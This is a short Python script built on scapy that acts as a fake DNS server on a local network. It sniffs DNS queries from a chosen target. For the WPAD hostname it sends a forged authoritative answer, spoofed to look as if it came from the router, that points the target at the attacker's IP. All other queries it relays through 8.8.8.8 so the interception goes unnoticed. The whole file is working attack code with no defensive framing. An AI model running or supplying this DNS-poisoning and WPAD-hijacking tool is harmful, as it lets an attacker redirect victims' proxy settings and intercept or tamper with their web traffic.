from termcolor import cprint # type: ignore
from scapy.all import conf, sniff, IP, DNSQR, DNSRR, DNS, UDP, send, sr1 # type: ignore

def __poison_response(pkt):
    original_qname = pkt[DNSQR].qname
    if WPAD_HOSTNAME in str(original_qname):
        fake_dns_pkt = IP()/UDP()/DNS()/DNSRR()

        fake_dns_pkt[IP].src = ROUTER_IP
        fake_dns_pkt[IP].dst = TARGET_IP

        fake_dns_pkt[UDP].sport = 53
        fake_dns_pkt[UDP].dport = pkt[UDP].sport

        fake_dns_pkt[DNS].id = pkt[DNS].id
        fake_dns_pkt[DNS].qd = pkt[DNS].qd
        fake_dns_pkt[DNS].aa = 1
        fake_dns_pkt[DNS].qr = 1
        fake_dns_pkt[DNS].ancount = 1

        fake_dns_pkt[DNSRR].qname = WPAD_HOSTNAME + '.'
        fake_dns_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
        fake_dns_pkt[DNSRR].rdata = ATTACKER_IP

        cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
        send(fake_dns_pkt, verbose=0)
        
    else:
        forward_pkt = IP()/UDP()/DNS()
        forward_pkt[IP].dst = GOOGLE_DNS
        forward_pkt[UDP].sport = pkt[UDP].sport
        forward_pkt[DNS].rd = 1
        forward_pkt[DNS].qd = DNSQR(qname=original_qname)

        google_response = sr1(forward_pkt, verbose=0)

        response_pkt = IP()/UDP()/DNS()
        response_pkt[IP].src = ATTACKER_IP
        response_pkt[IP].dst = TARGET_IP
        response_pkt[UDP].dport = pkt[UDP].sport
        response_pkt[DNS] = google_response[DNS]

        send(response_pkt, verbose=0)

def run(router_ip, target_ip, interface):
    global ATTACKER_IP
    global ROUTER_IP
    global TARGET_IP
    global WPAD_HOSTNAME
    global GOOGLE_DNS

    ATTACKER_IP = conf.ifaces[interface].ip
    ROUTER_IP = router_ip
    TARGET_IP = target_ip
    WPAD_HOSTNAME = 'wpad.localdomain'
    GOOGLE_DNS = '8.8.8.8'

    cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])
    bpf_filter = f'udp dst port 53 and not src host {ATTACKER_IP} and host {TARGET_IP}'

    sniff(prn=__poison_response, filter=bpf_filter, iface=interface)